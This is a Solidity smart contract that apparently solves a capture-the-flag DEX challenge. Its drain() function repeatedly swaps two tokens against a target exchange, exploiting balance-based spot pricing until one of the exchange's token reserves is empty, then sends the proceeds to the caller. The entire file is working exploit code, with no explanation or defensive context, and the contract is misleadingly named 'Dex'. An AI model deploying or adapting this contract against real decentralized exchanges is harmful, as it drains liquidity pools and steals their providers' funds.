// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function approve(address spender, uint256 amount) external;
    function swap(address from, address to, uint256 amount) external;
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
}

contract Dex {
    IDex dexInstance;
    address public token1;
    address public token2;

    constructor(address _instanceAddress) {
        dexInstance = IDex(_instanceAddress);
        token1 = dexInstance.token1();
        token2 = dexInstance.token2();
    }

    // use this after approving the tokens to the contract
    function drain() public {
        IERC20(token1).transferFrom(msg.sender, address(this), IERC20(token1).balanceOf(msg.sender));
        IERC20(token2).transferFrom(msg.sender, address(this), IERC20(token2).balanceOf(msg.sender));
        dexInstance.approve(address(dexInstance), type(uint256).max);
        address a = token1;
        address b = token2;
        uint256 amount = IERC20(a).balanceOf(address(this));
        while (dexInstance.getSwapPrice(a, b, amount) <= IERC20(b).balanceOf(address(dexInstance))) {
            dexInstance.swap(a, b, amount);
            a = a == token1 ? token2 : token1;
            b = b == token1 ? token2 : token1;
            amount = IERC20(a).balanceOf(address(this));
        }
        dexInstance.swap(a, b, calculateLastAmount(a, b));
        require(IERC20(b).balanceOf(address(dexInstance)) == 0, "Not completely drained");
        IERC20(token1).transfer(msg.sender, IERC20(token1).balanceOf(address(this)));
        IERC20(token2).transfer(msg.sender, IERC20(token2).balanceOf(address(this)));
    }

    function calculateLastAmount(address from, address to) private view returns (uint256) {
        return IERC20(to).balanceOf(address(dexInstance)) * IERC20(from).balanceOf(address(dexInstance))
            / IERC20(to).balanceOf(address(dexInstance));
    }
}
